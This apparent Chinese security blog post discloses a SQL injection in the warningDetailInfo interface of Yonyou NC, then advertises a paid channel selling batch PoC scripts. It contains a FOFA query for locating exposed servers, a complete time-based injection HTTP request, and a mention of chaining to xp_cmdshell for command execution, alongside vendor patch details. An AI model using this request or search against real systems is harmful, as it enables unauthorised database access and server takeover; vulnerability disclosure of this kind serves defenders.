#  用友NC warningDetailInfo接口存在SQL注入漏洞   
冷漠安全  冷漠安全   2024-05-23 21:08  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oABILx2icJxxajNaib5uic2Zu0vEJnFHklejTAd3txeUafxEgcvIAnRwtCgEF0JrenwZE9EWdEn9Q4w/640?wx_fmt=gif&from=appmsg "")  
  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
用友NC warningDetailInfo接口存在SQL注入漏洞  
用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。这一系列产品基于全球最新的互联网技术、云计算技术和移动应用技术，旨在帮助企业创新管理模式、引领商业变革。  
  
0x03  
  
**漏洞威胁**  
  
用友NC /ebvp/infopub/warningDetailInfo接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
  
影响范围：  
  
NC63、NC633、NC65  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="用友-UFIDA-NC"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qH1wYjRNP5YAyBLjmuGwxmugKanEv7jEiajmDXgGtVZSPib449HvpSuUfcO0ibSsZkJe14T7ep5DZ5A/640?wx_fmt=png&from=appmsg "")  
  
0x05  
  
**漏洞复现**  
  
POC  
```
GET /ebvp/infopub/warningDetailInfo?pageId=login&pkMessage=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```  
  
延时5秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qH1wYjRNP5YAyBLjmuGwxmveuXHOcvkG6vAdfibWx4icrXEGwCbKjP1jSIF0lwR7ehff6bzdsTqqaA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qH1wYjRNP5YAyBLjmuGwxmEIylET7WUeCXGHoA8ibGjwGpFdNicZO82NcCGQLXrnFzL2CkZkhQZ7yw/640?wx_fmt=png&from=appmsg "")  
  
0x07  
  
**修复建议**  
  
打对应补丁，重启服务，各版本补丁获取方式如下：  
  
NC63方案  
  
补丁名称：  
```
patch_63-电采-ebvpinfopubwarningDetailInfo接口sql注入问题
```  
  
补丁编码：  
```
NCM_NC6.3_000_109902_20240520_GP_202177928
```  
  
校验码：  
```
56489e159fff13d87754bc6d3ee365bc5e48f3b25b088ae329027119170df746
```  
  
NC633方案  
  
补丁名称：  
```
patch_633-电采-ebvpinfopubwarningDetailInfo接口sql注入问题
```  
  
补丁编码：  
```
NCM_NC6.33_000_109902_20240520_GP_202206096
```  
  
校验码：  
```
38aa7d38833506e51a368727dd940a75dc672776ff19b1802bcf399d3102b3e4
```  
  
NC65方案  
  
补丁名称：  
```
patch_65-电采-ebvpinfopubwarningDetailInfo接口sql注入问题
```  
  
补丁编码：  
```
NCM_NC6.5_000_109902_20240520_GP_202227506
```  
  
校验码：  
```
2e578d9f6075383ac9748517470413d7304f7fdff23dc6b57c0e75b625b52459
```  
  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qH1wYjRNP5YAyBLjmuGwxm2OrxdRSq7n0yrjGDEIfPib5DJ60FkD9ux5E6XM2lwMg4ToAFdU8NWGA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qH1wYjRNP5YAyBLjmuGwxmtpIOpJjr15C68CicszKuibuCsAogDm9LPBibuCdlxaZBge7lc99ByCA1w/640?wx_fmt=gif&from=appmsg "")  
  
  
  
